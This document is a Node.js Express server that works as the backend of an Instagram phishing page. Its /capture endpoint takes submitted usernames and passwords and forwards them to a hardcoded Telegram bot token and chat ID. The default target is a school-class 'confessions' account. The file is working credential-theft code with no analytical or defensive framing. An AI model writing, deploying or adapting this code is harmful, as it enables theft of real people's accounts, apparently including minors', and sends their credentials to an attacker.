const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// YOUR TELEGRAM DETAILS
const TELEGRAM_TOKEN = "8696476669:AAGMMBP7BKj3f_D4KwMU4xbVMEj4q_hZqr4";
const CHAT_ID = "8725339154";

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

app.post('/capture', async (req, res) => {
    const { username, password, target, time } = req.body || {};

    if (!username || !password) {
        return res.json({ success: true });
    }

    console.log(`[CAPTURED] Username: ${username}`);

    const message = `
*Instagram Login Captured* 🔥

*Username / Email:* ${username}
*Password:* ||${password}||
*Target:* ${target || "smrj.class9.confessions"}
*Time:* ${time ? new Date(time).toLocaleString() : new Date().toLocaleString()}
    `.trim();

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "MarkdownV2"
            })
        });
        console.log("✅ Sent to Telegram successfully");
    } catch (err) {
        console.error("❌ Telegram error:", err.message);
    }

    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
